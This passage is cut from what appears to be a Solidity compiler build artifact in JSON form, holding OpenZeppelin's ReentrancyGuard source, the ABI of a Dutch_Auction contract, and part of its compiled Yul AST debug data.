`nonReentrant` may not call one another. This can be worked around by making\\n * those functions `private`, and then adding `external` `nonReentrant` entry\\n * points to them.\\n *\\n * TIP: If you would like to learn more about reentrancy and alternative ways\\n * to protect against it, check out our blog post\\n * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].\\n */\\nabstract contract ReentrancyGuard {\\n    // Booleans are more expensive than uint256 or any type that takes up a full\\n    // word because each write operation emits an extra SLOAD to first read the\\n    // slot's contents, replace the bits taken up by the boolean, and then write\\n    // back. This is the compiler's defense against contract upgrades and\\n    // pointer aliasing, and it cannot be disabled.\\n\\n    // The values being non-zero value makes deployment a bit more expensive,\\n    // but in exchange the refund on every call to nonReentrant will be lower in\\n    // amount. Since refunds are capped to a percentage of the total\\n    // transaction's gas, it is best to keep them low in cases like this one, to\\n    // increase the likelihood of the full refund coming into effect.\\n    uint256 private constant NOT_ENTERED = 1;\\n    uint256 private constant ENTERED = 2;\\n\\n    uint256 private _status;\\n\\n    /**\\n     * @dev Unauthorized reentrant call.\\n     */\\n    error ReentrancyGuardReentrantCall();\\n\\n    constructor() {\\n        _status = NOT_ENTERED;\\n    }\\n\\n    /**\\n     * @dev Prevents a contract from calling itself, directly or indirectly.\\n     * Calling a `nonReentrant` function from another `nonReentrant`\\n     * function is not supported. It is possible to prevent this from happening\\n     * by making the `nonReentrant` function external, and making it call a\\n     * `private` function that does the actual work.\\n     */\\n    modifier nonReentrant() {\\n        _nonReentrantBefore();\\n        _;\\n        _nonReentrantAfter();\\n    }\\n\\n    function _nonReentrantBefore() private {\\n        // On the first call to nonReentrant, _status will be NOT_ENTERED\\n        if (_status == ENTERED) {\\n            revert ReentrancyGuardReentrantCall();\\n        }\\n\\n        // Any calls to nonReentrant after this point will fail\\n        _status = ENTERED;\\n    }\\n\\n    function _nonReentrantAfter() private {\\n        // By storing the original value once again, a refund is triggered (see\\n        // https://eips.ethereum.org/EIPS/eip-2200)\\n        _status = NOT_ENTERED;\\n    }\\n\\n    /**\\n     * @dev Returns true if the reentrancy guard is currently set to \\\"entered\\\", which indicates there is a\\n     * `nonReentrant` function in the call stack.\\n     */\\n    function _reentrancyGuardEntered() internal view returns (bool) {\\n        return _status == ENTERED;\\n    }\\n}\\n\",\"keccak256\":\"0xf980daa263b661ab8ddee7d4fd833c7da7e7995e2c359ff1f17e67e4112f2236\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[{"astId":936,"contract":"@openzeppelin/contracts/utils/ReentrancyGuard.sol:ReentrancyGuard","label":"_status","offset":0,"slot":"0","type":"t_uint256"}],"types":{"t_uint256":{"encoding":"inplace","label":"uint256","numberOfBytes":"32"}}},"userdoc":{"kind":"user","methods":{},"version":1}}},"contracts/Dutch_Auction.sol":{"Dutch_Auction":{"abi":[{"inputs":[{"internalType":"uint256","name":"_reservePrice","type":"uint256"},{"internalType":"uint256","name":"_startPrice","type":"uint256"}],"stateMutability":"payable","type":"constructor"},{"inputs":[],"name":"Dutch_Auction__IsOwner","type":"error"},{"inputs":[],"name":"Dutch_Auction__NotOpen","type":"error"},{"inputs":[],"name":"Dutch_Auction__NotOwner","type":"error"},{"inputs":[],"name":"Dutch_Auction__Open","type":"error"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"bidderAddress","type":"address"},{"indexed":false,"internalType":"uint256","name":"TokensPurchased","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"refundValue","type":"uint256"}],"name":"RefundEvent","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"bidderID","type":"uint256"},{"indexed":false,"internalType":"address","name":"walletAddress","type":"address"},{"indexed":false,"internalType":"uint256","name":"bidvalue","type":"uint256"}],"name":"addBidderEvent","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"bidderAddress","type":"address"},{"indexed":false,"internalType":"uint256","name":"TokensPurchased","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"refundValue","type":"uint256"}],"name":"calculateEvent","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"totalBidders","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"burntERC20","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"totalETHEarned","type":"uint256"}],"name":"endAuctionEvent","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"bidderAddress","type":"address"},{"indexed":false,"internalType":"uint256","name":"tokensSent","type":"uint256"}],"name":"sendTokenEvent","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"startTime","type":"uint256"},{"indexed":false,"internalType":"address","name":"ERC20Address","type":"address"},{"indexed":false,"internalType":"uint256","name":"totalAlgosAvailable","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"changePerMin","type":"uint256"}],"name":"startAuctionEvent","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"timeElapsed","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"currentprice","type":"uint256"}],"name":"updateCurrentPriceEvent","type":"event"},{"stateMutability":"payable","type":"fallback"},{"inputs":[],"name":"addBidder","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"bidder","type":"uint256"}],"name":"balanceOfBidder","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"biddersList","outputs":[{"internalType":"uint256","name":"bidderID","type":"uint256"},{"internalType":"address","name":"walletAddress","type":"address"},{"internalType":"uint256","name":"bidValue","type":"uint256"},{"internalType":"uint256","name":"totalAlgosPurchased","type":"uint256"},{"internalType":"uint256","name":"refundEth","type":"uint256"},{"internalType":"bool","name":"isExist","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"calculate","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"endAuction","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getAuctionState","outputs":[{"internalType":"enum Dutch_Auction.AuctionState","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"refundETH","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"bidder","type":"uint256"}],"name":"retrieveBidderAlgos","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"bidder","type":"uint256"}],"name":"retrieveBidderBidValue","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"retrieveContractBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"retrieveContractOwner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"retrieveCurrentPrice","outputs":[{"internalType":"int256","name":"","type":"int256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"bidder","type":"uint256"}],"name":"retrieveRefund","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"retrieveReservePrice","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"retrieveTotalAlgos","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"retrieveTotalBidder","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"sendTokens","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_totalAlgosAvailable","type":"uint256"},{"internalType":"uint256","name":"_changePerMin","type":"uint256"}],"name":"startAuction","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"updateCurrentPrice","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}],"devdoc":{"kind":"dev","methods":{},"version":1},"evm":{"bytecode":{"functionDebugData":{"@_1100":{"entryPoint":null,"id":1100,"parameterSlots":2,"returnSlots":0},"abi_decode_t_uint256_fromMemory":{"entryPoint":312,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_tuple_t_uint256t_uint256_fromMemory":{"entryPoint":335,"id":null,"parameterSlots":2,"returnSlots":2},"abi_encode_t_stringliteral_38757c7dcf65b5437abfa02f01861a03ff1102a815613df32ef87b07e7430473_to_t_string_memory_ptr_fromStack":{"entryPoint":502,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_38757c7dcf65b5437abfa02f01861a03ff1102a815613df32ef87b07e7430473__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":541,"id":null,"parameterSlots":1,"returnSlots":1},"allocate_unbounded":{"entryPoint":null,"id":null,"parameterSlots":0,"returnSlots":1},"array_storeLengthForEncoding_t_string_memory_ptr_fromStack":{"entryPoint":406,"id":null,"parameterSlots":2,"returnSlots":1},"cleanup_t_uint256":{"entryPoint":276,"id":null,"parameterSlots":1,"returnSlots":1},"panic_error_0x21":{"entryPoint":575,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db":{"entryPoint":null,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b":{"entryPoint":271,"id":null,"parameterSlots":0,"returnSlots":0},"store_literal_in_memory_38757c7dcf65b5437abfa02f01861a03ff1102a815613df32ef87b07e7430473":{"entryPoint":423,"id":null,"parameterSlots":1,"returnSlots":0},"validator_revert_t_uint256":{"entryPoint":286,"id":null,"parameterSlots":1,"returnSlots":0}},"generatedSources":[{"ast":{"nativeSrc":"0:2597:10","nodeType":"YulBlock","src":"0:2597:10","statements":[{"body":{"nativeSrc":"47:35:10","nodeType":"YulBlock","src":"47:35:10","statements":[{"nativeSrc":"57:19:10","nodeType":"YulAssignment","src":"57:19:10","value":{"arguments":[{"kind":"number","nativeSrc":"73:2:10","nodeType":"YulLiteral","src":"73:2:10","type":"","value":"64"}],"functionName":{"name":"mload","nativeSrc":"67:5:10","nodeType":"YulIdentifier","src":"67:5:10"},"nativeSrc":"67:9:10","nodeType":"YulFunctionCall","src":"67:9:10"},"variableNames":[{"name":"memPtr","nativeSrc":"57:6:10","nodeType":"YulIdentifier","src":"57:6:10"}]}]},"name":"allocate_unbounded","nativeSrc":"7:75:10","nodeType":"YulFunctionDefinition","returnVariables":[{"name":"memPtr","nativeSrc":"40:6:10","nodeType":"YulTypedName","src":"40:6:10","type":""}],"src":"7:75:10"},{"body":{"nativeSrc":"177:28:10","nodeType":"YulBlock","src":"177:28:10","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"194:1:10","nodeType":"YulLiteral","src":"194:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"197:1:10","nodeType":"YulLiteral","src":"197:1:10","type":"","value":"0"}],"functionName":{"name":"revert","nativeSrc":"187:6:10","nodeType":"YulIdentifier","src":"187:6:10"},"nativeSrc":"187:12:10","nodeType":"YulFunctionCall","src":"187:12:10"},"nativeSrc":"187:12:10","nodeType":"YulExpressionStatement","src":"187:12:10"}]},"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nativeSrc":"88:117:10","nodeType":"YulFunctionDefinition","src":"88:117:10"},{"body":{"nativeSrc":"300:28:10","nodeType":"YulBlock","src":"300:28:10","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"317:1:10","nodeType":"YulLiteral","src":"317:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"320:1:10","nodeType":"YulLiteral","src":"320:1:10","type":"","value":"0"}],"functionName":{"name":"revert","nativeSrc":"310:6:10","nodeType":"YulIdentifier","src":"310:6:10"},"nativeSrc":"310:12:10","nodeType":"YulFunctionCall","src":"310:12:10"},"nativeSrc":"310:12:10","nodeType":"YulExpressionStatement","src":"310:12:10"}]},"name":"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db","nativeSrc":"211:117:10","nodeType":"YulFunctionDefinition","src":"211:117:10"},{"body":{"nativeSrc":"379:32:10","nodeType":"YulBlock","src":"379:32:10","statements":[{"nativeSrc":"389:16:10","nodeType":"YulAssignment","src":"389:16:10","value":{"name":"value","nativeSrc":"400:5:10","nodeType":"YulIdentifier","src":"400:5:10"},"variableNames":[{"name":"cleaned","nativeSrc":"389:7:10","nodeType":"YulIdentifier","src":"389:7:10"}]}]},"name":"cleanup_t_uint256","nativeSrc":"334:77:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"361:5:10","nodeType":"YulTypedName","src":"361:5:10","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"371:7:10","nodeType":"YulTypedName","src":"371:7:10","type":""}],"src":"334:77:10"},{"body":{"nativeSrc":"460:79:10","nodeType":"YulBlock","src":"460:79:10","statements":[{"body":{"nativeSrc":"517:16:10","nodeType":"YulBlock","src":"517:16:10","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"526:1:10","nodeType":"YulLiteral","src":"526:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"529:1:10","nodeType":"YulLiteral","src":"529:1:10","type":"","value":"0"}],"functionName":{"name":"revert","nativeSrc":"519:6:10","nodeType":"YulIdentifier","src":"519:6:10"},"nativeSrc":"519:12:10","nodeType":"YulFunctionCall","src":"519:12:10"},"nativeSrc":"519:12:10","nodeType":"YulExpressionStatement","src":"519:12:10"}]},"condition":{"arguments":[{"arguments":[{"name":"value","nativeSrc":"483:5:10","nodeType":"YulIdentifier","src":"483:5:10"},{"arguments":[{"name":"value","nativeSrc":"508:5:10","nodeType":"YulIdentifier","src":"508:5:10"}],"functionName":{"name":"cleanup_t_uint256","nativeSrc":"490:17:10","nodeType":"YulIdentifier","src":"490:17:10"},"nativeSrc":"490:24:10","nodeType":"YulFunctionCall","src":"490:24:10"}],"functionName":{"name":"eq","nativeSrc":"480:2:10","nodeType":"YulIdentifier","src":"480:2:10"},"nativeSrc":"480:35:10","nodeType":"YulFunctionCall","src":"480:35:10"}],"functionName":{"name":"iszero","nativeSrc":"473:6:10","nodeType":"YulIdentifier","src":"473:6:10"},"nativeSrc":"473:43:10","nodeType":"YulFunctionCall","src":"473:43:10"},"nativeSrc":"470:63:10","nodeType":"YulIf","src":"470:63:10"}]},"name":"validator_revert_t_uint256","nativeSrc":"417:122:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"453:5:10","nodeType":"YulTypedName","src":"453:5:10","type":""}],"src":"417:122:10"},{"body":{"nativeSrc":"608:80:10","nodeType":"YulBlock","src":"608:80:10","statements":[{"nativeSrc":"618:22:10","nodeType":"YulAssignment","src":"618:22:10","value":{"arguments":[{"name":"offset","nativeSrc":"633:6:10","nodeType":"YulIdentifier","src":"633:6:10"}],"functionName":{"name":"mload","nativeSrc":"627:5:10","nodeType":"YulIdentifier","src":"627:5:10"},"nativeSrc":"627:13:10","nodeType":"YulFunctionCall","src":"627:13:10"},"variableNames":[{"name":"value","nativeSrc":"618:5:10","nodeType":"YulIdentifier","src":"618:5:10"}]},{"expression":{"arguments":[{"name":"value","nativeSrc":"676:5:10","nodeType":"YulIdentifier","src":"676:5:10"}],"functionName":{"name":"validator_revert_t_uint256","nativeSrc":"649:26:10","nodeType":"YulIdentifier","src":"649:26:10"},"nativeSrc":"649:33:10","nodeType":"YulFunctionCall","src":"649:33:10"},"nativeSrc":"649:33:10","nodeType":"YulExpressionStatement","src":"649:33:10"}]},"name":"abi_decode_t_uint256_fromMemory","nativeSrc":"545:143:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nativeSrc":"586:6:10","nodeType":"YulTypedName","src":"586:6:10","type":""},{"name":"end","nativeSrc":"594:3:10","nodeType":"YulTypedName","src":"594:3:10","type":""}],"returnVariables":[{"name":"value","nativeSrc":"602:5:10","nodeType":"YulTypedName","src":"602:5:10","type":""}],"src":"545:143:10"},{"body":{"nativeSrc":"788:413:10","nodeType":"YulBlock","src":"788:413:10","statements":[{"body":{"nativeSrc":"834:83:10","nodeType":"YulBlock","src":"834:83:10","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nativeSrc":"836:77:10","nodeType":"YulIdentifier","src":"836:77:10"},"nativeSrc":"836:79:10","nodeType":"YulFunctionCall","src":"836:79:10"},"nativeSrc":"836:79:10","nodeType":"YulExpressionStatement","src":"836:79:10"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nativeSrc":"809:7:10","nodeType":"YulIdentifier","src":"809:7:10"},{"name":"headStart","nativeSrc":"818:9:10","nodeType":"YulIdentifier","src":"818:9:10"}],"functionName":{"name":"sub","nativeSrc":"805:3:10","nodeType":"YulIdentifier","src":"805:3:10"},"nativeSrc":"805:23:10","nodeType":"YulFunctionCall","src":"805:23:10"},{"kind":"number","nativeSrc":"830:2:10","nodeType":"YulLiteral","src":"830:2:10","type":"","value":"64"}],"functionName":{"name":"slt","nativeSrc":"801:3:10","nodeType":"YulIdentifier","src":"801:3:10"},"nativeSrc":"801:32:10","nodeType":"YulFunctionCall","src":"801:32:10"},"nativeSrc":"798:119:10","nodeType":"YulIf","src":"798:119:10"},{"nativeSrc":"927:128:10","nodeType":"YulBlock","src":"927:128:10","statements":[{"nativeSrc":"942:15:10","nodeType":"YulVariableDeclaration","src":"942:15:10","value":{"kind":"number","nativeSrc":"956:1:10","nodeType":"YulLiteral","src":"956:1:10","type":"","value":"0"},"variables":[{"name":"offset","nativeSrc":"946:6:10","nodeType":"YulTypedName","src":"946:6:10","type":""}]},{"nativeSrc":"971:74:10","nodeType":"YulAssignment","src":"971:74:10","value":{"arguments":[{"arguments":[{"name":"headStart","nativeSrc":"1017:9:10","nodeType":"YulIdentifier","src":"1017:9:10"},{"name":"offset","nativeSrc":"1028:6:10","nodeType":"YulIdentifier","src":"1028:6:10"}],"functionName":{"name":"add","nativeSrc":"1013:3:10","nodeType":"YulIdentifier","src":"1013:3:10"},"nativeSrc":"1013:22:10","nodeType":"YulFunctionCall","src":"1013:22:10"},{"name":"dataEnd","nativeSrc":"1037:7:10","nodeType":"YulIdentifier","src":"1037:7:10"}],"functionName":{"name":"abi_decode_t_uint256_fromMemory","nativeSrc":"981:31:10","nodeType":"YulIdentifier","src":"981:31:10"},"nativeSrc":"981:64:10","nodeType":"YulFunctionCall","src":"981:64:10"},"variableNames":[{"name":"value0","nativeSrc":"971:6:10","nodeType":"YulIdentifier","src":"971:6:10"}]}]},{"nativeSrc":"1065:129:10","nodeType":"YulBlock","src":"1065:129:10","statements":[{"nativeSrc":"1080:16:10","nodeType":"YulVariableDeclaration","src":"1080:16:10","value":{"kind":"number","nativeSrc":"1094:2:10","nodeType":"YulLiteral","src":"1094:2:10","type":"","value":"32"},"variables":[{"name":"offset","nativeSrc":"1084:6:10","nodeType":"YulTypedName","src":"1084:6:10","type":""}]},{"nativeSrc":"1110:74:10","nodeType":"YulAssignment","src":"1110:74:10","value":{"arguments":[{"arguments":[{"name":"headStart","nativeSrc":"1156:9:10","nodeType":"YulIdentifier","src":"1156:9:10"},{"name":"offset","nativeSrc":"1167:6:10","nodeType":"YulIdentifier","src":"1167:6:10"}],"functionName":{"name":"add","nativeSrc":"1152:3:10","nodeType":"YulIdentifier","src":"1152:3:10"},"nativeSrc":"1152:22:10","nodeType":"YulFunctionCall","src":"1152:22:10"},{"name":"dataEnd","nativeSrc":"1176:7:10","nodeType":"YulIdentifier","src":"1176:7:10"}],"functionName":{"name":"abi_decode_t_uint256_fromMemory","nativeSrc":"1120:31:10","nodeType":"YulIdentifier","src":"1120:31:10"},"nativeSrc":"1120:64:10","nodeType":"YulFunctionCall","src":"1120:64:10"},"variableNames":[{"name":"value1","nativeSrc":"1110:6:10","nodeType":"YulIdentifier","src":"1110:6:10"}]}]}]},"name":"abi_decode_tuple_t_uint256t_uint256_fromMemory","nativeSrc":"694:507:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"750:9:10","nodeType":"YulTypedName","src":"750:9:10","type":""},{"name":"dataEnd","nativeSrc":"761:7:10","nodeType":"YulTypedName","src":"761:7:10","type":""}],"returnVariables":[{"name":"value0","nativeSrc":"773:6:10","nodeType":"YulTypedName","src":"773:6:10","type":""},{"name":"value1","nativeSrc":"781:6:10","nodeType":"YulTypedName","src":"781:6:10","type":""}],"src":"694:507:10"},{"body":{"nativeSrc":"1303:73:10","nodeType":"YulBlock","src":"1303:73:10","statements":[{"expression":{"arguments":[{"name":"pos","nativeSrc":"1320:3:10","nodeType":"YulIdentifier","src":"1320:3:10"},{"name":"length","nativeSrc":"1325:6:10","nodeType":"YulIdentifier","src":"1325:6:10"}],"functionName":{"name":"mstore","nativeSrc":"1313:6:10","nodeType":"YulIdentifier","src":"1313:6:10"},"nativeSrc":"1313:19:10","nodeType":"YulFunctionCall","src":"1313:19:10"},"nativeSrc":"1313:19:10","nodeType":"YulExpressionStatement","src":"1313:19:10"},{"nativeSrc":"1341:29:10","nodeType":"YulAssignment","src":"1341:29:10","value":{"arguments":[{"name":"pos","nativeSrc":"1360:3:10","nodeType":"YulIdentifier","src":"1360:3:10"},{"kind":"number","nativeSrc":"1365:4:10","nodeType":"YulLiteral","src":"1365:4:10","type":"","value":"0x20"}],"functionName":{"name":"add","nativeSrc":"1356:3:10","nodeType":"YulIdentifier","src":"1356:3:10"},"nativeSrc":"1356:14:10","nodeType":"YulFunctionCall","src":"1356:14:10"},"variableNames":[{"name":"updated_pos","nativeSrc":"1341:11:10","nodeType":"YulIdentifier","src":"1341:11:10"}]}]},"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nativeSrc":"1207:169:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nativeSrc":"1275:3:10","nodeType":"YulTypedName","src":"1275:3:10","type":""},{"name":"length","nativeSrc":"1280:6:10","nodeType":"YulTypedName","src":"1280:6:10","type":""}],"returnVariables":[{"name":"updated_pos","nativeSrc":"1291:11:10","nodeType":"YulTypedName","src":"1291:11:10","type":""}],"src":"1207:169:10"},{"body":{"nativeSrc":"1488:123:10","nodeType":"YulBlock","src":"1488:123:10","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nativeSrc":"1510:6:10","nodeType":"YulIdentifier","src":"1510:6:10"},{"kind":"number","nativeSrc":"1518:1:10","nodeType":"YulLiteral","src":"1518:1:10","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"1506:3:10","nodeType":"YulIdentifier","src":"1506:3:10"},"nativeSrc":"1506:14:10","nodeType":"YulFunctionCall","src":"1506:14:10"},{"hexValue":"7265736572766520707269636520697320686967686572207468616e20637572","kind":"string","nativeSrc":"1522:34:10","nodeType":"YulLiteral","src":"1522:34:10","type":"","value":"reserve price is higher than cur"}],"functionName":{"name":"mstore","nativeSrc":"1499:6:10","nodeType":"YulIdentifier","src":"1499:6:10"},"nativeSrc":"1499:58:10","nodeType":"YulFunctionCall","src":"1499:58:10"},"nativeSrc":"1499:58:10","nodeType":"YulExpressionStatement","src":"1499:58:10"},{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nativeSrc":"1578:6:10","nodeType":"YulIdentifier","src":"1578:6:10"},{"kind":"number","nativeSrc":"1586:2:10","nodeType":"YulLiteral","src":"1586:2:10","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"1574:3:10","nodeType":"YulIdentifier","src":"1574:3:10"},"nativeSrc":"1574:15:10","nodeType":"YulFunctionCall","src":"1574:15:10"},{"hexValue":"72656e74207072696365","kind":"string","nativeSrc":"1591:12:10","nodeType":"YulLiteral","src":"1591:12:10","type":"","value":"rent price"}],"functionName":{"name":"mstore","nativeSrc":"1567:6:10","nodeType":"YulIdentifier","src":"1567:6:10"},"nativeSrc":"1567:37:10","nodeType":"YulFunctionCall","src":"1567:37:10"},"nativeSrc":"1567:37:10","nodeType":"YulExpressionStatement","src":"1567:37:10"}]},"name":"store_literal_in_memory_38757c7dcf65b5437abfa02f01861a03ff1102a815613df32ef87b07e7430473","nativeSrc":"1382:229:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nativeSrc":"1480:6:10","nodeType":"YulTypedName","src":"1480:6:10","type":""}],"src":"1382:229:10"},{"body":{"nativeSrc":"1763:220:10","nodeType":"YulBlock","src":"1763:220:10","statements":[{"nativeSrc":"1773:74:10","nodeType":"YulAssignment","src":"1773:74:10","value":{"arguments":[{"name":"pos","nativeSrc":"1839:3:10","nodeType":"YulIdentifier","src":"1839:3:10"},{"kind":"number","nativeSrc":"1844:2:10","nodeType":"YulLiteral","src":"1844:2:10","type":"","value":"42"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nativeSrc":"1780:58:10","nodeType":"YulIdentifier","src":"1780:58:10"},"nativeSrc":"1780:67:10","nodeType":"YulFunctionCall","src":"1780:67:10"},"variableNames":[{"name":"pos","nativeSrc":"1773:3:10","nodeType":"YulIdentifier","src":"1773:3:10"}]},{"expression":{"arguments":[{"name":"pos","nativeSrc":"1945:3:10","nodeType":"YulIdentifier","src":"1945:3:10"}],"functionName":{"name":"store_literal_in_memory_38757c7dcf65b5437abfa02f01861a03ff1102a815613df32ef87b07e7430473","nativeSrc":"1856:88:10","nodeType":"YulIdentifier","src":"1856:88:10"},"nativeSrc":"1856:93:10","nodeType":"YulFunctionCall","src":"1856:93:10"},"nativeSrc":"1856:93:10","nodeType":"YulExpressionStatement","src":"1856:93:10"},{"nativeSrc":"1958:19:10","nodeType":"YulAssignment","src":"1958:19:10","value":{"arguments":[{"name":"pos","nativeSrc":"1969:3:10","nodeType":"YulIdentifier","src":"1969:3:10"},{"kind":"number","nativeSrc":"1974:2:10","nodeType":"YulLiteral","src":"1974:2:10","type":"","value":"64"}],"functionName":{"name":"add","nativeSrc":"1965:3:10","nodeType":"YulIdentifier","src":"1965:3:10"},"nativeSrc":"1965:12:10","nodeType":"YulFunctionCall","src":"1965:12:10"},"variableNames":[{"name":"end","nativeSrc":"1958:3:10","nodeType":"YulIdentifier","src":"1958:3:10"}]}]},"name":"abi_encode_t_stringliteral_38757c7dcf65b5437abfa02f01861a03ff1102a815613df32ef87b07e7430473_to_t_string_memory_ptr_fromStack","nativeSrc":"1617:366:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nativeSrc":"1751:3:10","nodeType":"YulTypedName","src":"1751:3:10","type":""}],"returnVariables":[{"name":"end","nativeSrc":"1759:3:10","nodeType":"YulTypedName","src":"1759:3:10","type":""}],"src":"1617:366:10"},{"body":{"nativeSrc":"2160:248:10","nodeType":"YulBlock","src":"2160:248:10","statements":[{"nativeSrc":"2170:26:10","nodeType":"YulAssignment","src":"2170:26:10","value":{"arguments":[{"name":"headStart","nativeSrc":"2182:9:10","nodeType":"YulIdentifier","src":"2182:9:10"},{"kind":"number","nativeSrc":"2193:2:10","nodeType":"YulLiteral","src":"2193:2:10","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"2178:3:10","nodeType":"YulIdentifier","src":"2178:3:10"},"nativeSrc":"2178:18:10","nodeType":"YulFunctionCall","src":"2178:18:10"},"variableNames":[{"name":"tail","nativeSrc":"2170:4:10","nodeType":"YulIdentifier","src":"2170:4:10"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nativeSrc":"2217:9:10","nodeType":"YulIdentifier","src":"2217:9:10"},{"kind":"number","nativeSrc":"2228:1:10","nodeType":"YulLiteral","src":"2228:1:10","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"2213:3:10","nodeType":"YulIdentifier","src":"2213:3:10"},"nativeSrc":"2213:17:10","nodeType":"YulFunctionCall","src":"2213:17:10"},{"arguments":[{"name":"tail","nativeSrc":"2236:4:10","nodeType":"YulIdentifier","src":"2236:4:10"},{"name":"headStart","nativeSrc":"2242:9:10","nodeType":"YulIdentifier","src":"2242:9:10"}],"functionName":{"name":"sub","nativeSrc":"2232:3:10","nodeType":"YulIdentifier","src":"2232:3:10"},"nativeSrc":"2232:20:10","nodeType":"YulFunctionCall","src":"2232:20:10"}],"functionName":{"name":"mstore","nativeSrc":"2206:6:10","nodeType":"YulIdentifier","src":"2206:6:10"},"nativeSrc":"2206:47:10","nodeType":"YulFunctionCall","src":"2206:47:10"},"nativeSrc":"2206:47:10","nodeType":"YulExpressionStatement","src":"2206:47:10"},{"nativeSrc":"2262:139:10","nodeType":"YulAssignment","src":"2262:139:10","value":{"arguments":[{"name":"tail","nativeSrc":"2396:4:10","nodeType":"YulIdentifier","src":"2396:4:10"}],"functionName":{"name":"abi_encode_t_stringliteral_38757c7dcf65b5437abfa02f01861a03ff1102a815613df32ef87b07e7430473_to_t_string_memory_ptr_fromStack","nativeSrc":"2270:124:10","nodeType":"YulIdentifier","src":"2270:124:10"},"nativeSrc":"2270:131:10","nodeType":"YulFunctionCall","src":"2270:131:10"},"variableNames":[{"name":"tail","nativeSrc":"2262:4:10","nodeType":"YulIdentifier","src":"2262:4:10"}]}]},"name":"abi_encode_tuple_t_stringliteral_38757c7dcf65b5437abfa02f01861a03ff1102a815613df32ef87b07e7430473__to_t_string_memory_ptr__fromStack_reversed","nativeSrc":"1989:419:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"2140:9:10","nodeType":"YulTypedName","src":"2140:9:10","type":""}],"returnVariables":[{"name":"tail","nativeSrc